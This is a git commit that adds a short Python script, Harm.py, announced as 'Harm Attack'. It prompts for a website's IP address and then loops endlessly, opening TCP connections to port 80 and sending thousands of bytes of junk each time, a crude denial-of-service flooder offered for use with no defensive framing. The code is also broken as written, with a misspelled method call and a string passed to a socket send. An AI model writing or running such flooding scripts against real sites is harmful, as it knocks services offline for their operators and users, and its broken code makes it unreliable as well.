364baf49ce712c337fd55026f5136fff98cb77b9
harm20 <70063520+harm20@users.noreply.github.com>
2022-08-19 16:27:47 +0300

    Create Harm.py

---
+++ Harm.py
@@ -0,0 +1,11 @@
+import socket
+Name = ("Welcome in Harm Attack")
+print(Name.tittle())
+ip = input("Enter ip Website : ")
+while True :
+    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    socket.setdefaulttimeout(1)
+    conn = sock.connect((ip,80))
+    data = "weurytlfjcbslvnkhriogtyojqfbewjfb"*1000
+    sock.send(data)
+    print('Harm Attack for ip',ip,'port 80')
